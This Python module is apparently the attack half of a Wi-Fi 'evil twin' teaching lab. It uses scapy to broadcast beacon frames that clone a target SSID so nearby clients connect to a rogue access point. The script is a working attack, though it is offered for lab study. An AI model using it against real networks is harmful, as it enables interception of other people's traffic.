# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-evil-twin: beacon a cloned SSID (rogue AP). LAB ONLY.

Broadcasts beacons for a target SSID from the attacker's BSSID so nearby clients
associate to the twin and their traffic transits the attacker. Requires an AP-
capable / monitor-mode NIC; not replayable in the netns lab.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    mac = args.bssid
    beacon = (
        s.RadioTap()
        / s.Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
        / s.Dot11Beacon(cap="ESS")
        / s.Dot11Elt(ID="SSID", info=args.ssid)
    )
    print(f"[*] beaconing evil twin '{args.ssid}' (BSSID {mac}) on {args.iface}")
    s.sendp(beacon, iface=args.iface, count=args.count, inter=args.interval, verbose=0)
    verdict("ALERT", f"advertised twin SSID '{args.ssid}'")
    return 0
